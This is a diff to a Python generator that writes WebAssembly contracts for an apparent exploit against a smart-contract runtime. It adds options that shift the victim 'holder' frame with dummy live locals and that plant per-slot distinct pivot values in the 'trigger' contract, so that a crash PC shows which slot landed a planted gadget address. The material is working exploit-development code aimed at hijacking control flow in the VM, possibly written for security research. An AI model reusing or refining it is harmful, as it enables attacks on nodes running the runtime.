@@ -48,7 +48,7 @@ ALLOCATOR = """  (global $heap (mut i32) (i32.const 8192))
   (func (export "interface_version_8"))"""
 
 
-def gen_holder(outdir):
+def gen_holder(outdir, dummy=0):
     req = ('{"wasm":{"smart":{"contract_addr":"%s","msg":"e30="}}}' % TRIGGER_ADDR).encode()
     N = 10  # staged locals; more locals => more spill pressure (mirrors the Rust HOLDER_WAT)
     # staged local values, derived from $env (distinct per slot: 0x1000..0x1009)
@@ -86,6 +86,9 @@ def gen_holder(outdir):
         "    (local $hit i32)",
         "    ;; stage distinctive values in locals (live across the query call)",
     ]
+    if dummy > 0:
+        lines.append("    " + " ".join(f"(local $d{k} i64)" for k in range(dummy)))
+        lines.append("    " + " ".join(f"(local.set $d{k} (i64.const 0))" for k in range(dummy)))
     for k in range(N):
         lines.append(f"    (local.set $l{k} {staged[k]})")
     lines += [
@@ -93,6 +96,11 @@ def gen_holder(outdir):
         "    (call $query (i32.const 16))",
         "    drop",
         f"    (local.set $hit {hit_expr})",
+    ]
+    for k in range(dummy):
+        # keep the dummy locals live across the call: OR their (zero) values into $hit
+        lines.append(f"    (local.set $hit (i32.or (local.get $hit) (i32.wrap_i64 (local.get $d{k}))))")
+    lines += [
         "    (if (result i32) (local.get $hit) (then (i32.const 1008)) (else (i32.const 32))))",
         ")",
         "",
@@ -102,8 +110,12 @@ def gen_holder(outdir):
     print("wrote", p, f"({len(req)}-byte request, {N}-local hit-reporting holder)")
 
 
-def gen_trigger(outdir, offset, iters, dense=False, live="load"):
-    vals = b"".join(struct.pack("<Q", GADGET) for _ in range(LIVE))
+def gen_trigger(outdir, offset, iters, dense=False, live="load", plants="uniform"):
+    if plants == "distinct":
+        # per-slot distinct pivot values: a crash PC reveals WHICH slot landed
+        vals = b"".join(struct.pack("<Q", 0x0041414100000000 + k) for k in range(LIVE))
+    else:
+        vals = b"".join(struct.pack("<Q", GADGET) for _ in range(LIVE))
     lines = [
         ";; E6b trigger contract (generated).",
         f";; call when (i + {offset}) & 511 == 0; loop {iters} iterations" if not dense else f";; dense: call every iteration; loop {iters} iterations",
@@ -199,10 +211,14 @@ def main():
     ap.add_argument("--dense", action="store_true", help="call db_read every iteration")
     ap.add_argument("--live", choices=["load", "computed"], default="load",
                     help="live-value kind: planted qword loads or computed (p1drift shape)")
+    ap.add_argument("--dummy", type=int, default=0,
+                    help="extra dummy holder locals (live across the call; shifts the holder frame)")
+    ap.add_argument("--plants", choices=["uniform", "distinct"], default="uniform",
+                    help="trigger planted pivot values: all equal or per-slot distinct (slot-ID)")
     args = ap.parse_args()
     os.makedirs(args.outdir, exist_ok=True)
-    gen_holder(args.outdir)
-    gen_trigger(args.outdir, args.offset, args.iters, args.dense, args.live)
+    gen_holder(args.outdir, args.dummy)
+    gen_trigger(args.outdir, args.offset, args.iters, args.dense, args.live, args.plants)
     gen_benign(args.outdir)
 
 
